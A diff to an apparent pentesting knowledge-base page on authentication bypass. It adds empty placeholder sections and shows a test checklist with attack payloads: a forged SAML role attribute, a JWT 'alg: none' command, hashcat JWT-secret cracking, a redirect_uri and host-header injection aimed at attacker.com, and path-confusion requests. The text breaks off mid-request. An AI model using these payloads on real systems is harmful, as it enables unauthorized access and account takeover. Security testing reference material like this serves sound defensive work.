@@ -1,5 +1,63 @@
 # Auth Bypass Techniques
 
+> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.
+
+_Last updated: — · Items: 0_
+
+---
+
+## What
+
+_Define the class, prerequisites, and typical finding shape. Fill with real content._
+_pending enrichment — baseline opener below_
+
+See items under ## Items for per-finding details.
+
+---
+
+## CVEs
+
+_No CVE-assigned items yet. Items below are pre-CVE or class-level findings._
+
+---
+
+## Probes
+
+_Grep, curl, nuclei probes for this class. Append as items arrive with real PoCs._
+_pending enrichment_
+
+---
+
+## PoCs
+
+_Public PoC links rolled up from items below._
+
+_No PoCs in items yet._
+
+---
+
+## Reproduction
+
+_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
+_pending enrichment_
+
+---
+
+## Defense
+
+_Patch guidance and detection rules. Populated from vendor advisories._
+_pending enrichment_
+
+---
+
+## References
+
+_Populated by daily refresh-latest pipeline._
+
+---
+
+## Items
+
 > Authentication bypass — exploiting implementation flaws in identity verification to gain access without valid credentials.
 
 ## Surface
@@ -15,6 +73,7 @@
 ## Test Approach
 
 1. **SAML attribute pollution** — intercept ACS request, duplicate attributes with different namespaces:
+
    ```xml
    <saml:Attribute Name="role">
      <saml:AttributeValue>user</saml:AttributeValue>
@@ -23,24 +82,32 @@
      <saml:AttributeValue>admin</saml:AttributeValue>
    </saml:Attribute>
    ```
+
 2. **XML signature wrapping (XSW)** — move the signed element, inject unsigned sibling with attacker data; use SAML Raider (Burp extension)
 3. **JWT `alg: none`** — remove signature, set `"alg": "none"`, see if backend accepts:
+
    ```
    echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='
    ```
+
 4. **JWT RS256→HS256 confusion** — sign token with server's public key as HMAC secret
 5. **JWT weak secret brute-force**:
+
    ```
    hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt
    ```
+
 6. **OAuth state CSRF** — remove `state` param from authorization request; if accepted, CSRF to link attacker account
 7. **Open redirect in redirect_uri** — try `redirect_uri=https://target.com/callback/../../../attacker.com`
 8. **Path confusion bypass** (Nginx/Apache):
+
    ```
    GET /app/admin%2F..%2Fapi/sensitive HTTP/1.1
    GET /app/admin;/api/sensitive HTTP/1.1
    ```
+
 9. **Password reset host header injection**:
+
    ```
    POST /reset-password HTTP/1.1
    Host: attacker.com
